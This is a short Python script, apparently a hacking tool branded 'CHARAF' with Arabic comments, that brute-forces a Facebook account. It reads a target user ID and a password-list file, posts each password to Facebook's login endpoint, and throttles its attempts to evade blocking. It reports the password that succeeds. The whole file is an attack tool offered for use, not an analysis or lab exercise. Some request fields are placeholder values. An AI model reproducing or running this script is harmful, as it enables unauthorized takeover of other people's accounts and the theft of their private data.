print ('''

CHARAF      CHARAF      CHARaF          CHARAf
______________________________________________

CHARAF   CHARAF      CHARAf          CHARAF

''')








import requests
import time

def attempt_login(user_id, password):
  """
  يحاول تسجيل الدخول إلى حساب فيسبوك باستخدام معرف المستخدم (ID) وكلمة المرور المحددين.

  المُدخلات:
    user_id: معرف المستخدم لحساب فيسبوك (ID).
    password: كلمة المرور لحساب فيسبوك.

  المخرجات:
    True إذا نجح تسجيل الدخول، False إذا فشل.
  """
  url = "https://www.facebook.com/login/ajax/attempt/"
  data = {
      "id": user_id,
      "password": password,
      "login_form": "1",
      "ch": "0",
      "locale": "ar_AR",
      "queryParams": {},
      "fb_dtsg": "Ag123456789",
      "identifier": "123456789"
  }
  response = requests.post(url, data=data)
  return "login_failed" not in response.text

def main():
  """
  الوظيفة الرئيسية للبرنامج.

  تطلب من المستخدم إدخال معرف المستخدم (ID) لحساب فيسبوك، ثم تسمح له باختيار ملف كلمات المرور، ثم تقوم بتحميل قائمة بكلمات المرور من الملف المختار ومحاولة تسجيل الدخول إلى الحساب باستخدام كل كلمة مرور.
  """
  user_id = input("أدخل معرف المستخدم (ID) لحساب فيسبوك: ")
  password_file_path = input("أدخل مسار ملف كلمات المرور: ")

  with open(password_file_path, "r") as passwords_file:
    passwords = passwords_file.read().splitlines()

  for password in passwords:
    print(f"Trying password: {password}")
    if attempt_login(user_id, password):
      print(f"Success! Password found: {password}")
      break
    time.sleep(0.5)  # Add a delay to avoid being blocked by Facebook

if __name__ == "__main__":
  main()
